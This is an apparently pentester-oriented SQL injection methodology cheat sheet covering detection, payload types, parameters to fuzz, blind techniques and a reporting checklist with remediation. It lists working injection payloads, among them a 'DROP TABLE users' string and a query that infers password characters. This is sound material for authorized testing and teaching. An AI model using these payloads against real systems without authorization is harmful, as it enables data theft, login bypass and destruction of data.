# SQL Injection (SQLi) Methodology

Goal: find injection points that allow data disclosure, modification, authentication bypass, or remote command execution via the database.

## Quick checks

* Look for input reflected in SQL-like errors, or behavior changes.
* Distinguish numeric vs string parameters (no quotes vs quotes).
* Identify DBMS (MySQL, PostgreSQL, MSSQL, Oracle) via error strings or functions.
* Look for responses that change with `' OR '1'='1` or time delays.

## Basic payloads

```
' OR '1'='1
' OR 1=1--
' OR 'a'='a' --
" OR "" = "
'; DROP TABLE users; --
```

Time-based payloads (MySQL/Postgres example):

```
' OR SLEEP(5) --
' OR pg_sleep(5) --
```

MSSQL: `'; WAITFOR DELAY '0:0:5'--`

Union-based exploration:

```
' UNION SELECT NULL,NULL--
' UNION SELECT user(),database(),version() --
```

Error-based payloads (cause DB errors to reveal info):

```
' and extractvalue(1,concat(0x7e,(SELECT database()))) --
```

## Parameters/Places to fuzz

```
id
user
username
email
search
q
product_id
order_id
category
page
filter
sort
sku
limit
offset
"data" (JSON)
```

## Testing steps

1. Identify injection points: test both GET and POST, JSON bodies, headers, cookies.
2. Test simple boolean payloads (`' OR '1'='1`) and look for behavior differences.
3. Use time-based payloads for blind SQLi when no error is returned.
4. Try union selects to enumerate columns and extract data, starting with `NULL` placeholders.
5. Fingerprint DBMS using version(), @@version, user().
6. Avoid destructive payloads unless out-of-scope and explicitly allowed.
7. Use parameterized tests in Burp Intruder for automation.

## Blind/Advanced techniques

* Boolean-based blind: `AND (SELECT SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a')` to infer characters.
* Time-based blind: use `SLEEP()` or `pg_sleep()`.
* Out-of-band exfil if allowed (load\_file, xp\_cmdshell) only with permission.

## Reporting checklist

* Vulnerable endpoint and parameter, example request/response.
* Type of SQLi (error, union, boolean blind, time blind).
* Extracted proof-of-concept data (non-sensitive, e.g., schema names) where allowed.
* Impact and remediation: use prepared statements, ORM parameterization, input validation, least privilege DB user.

---

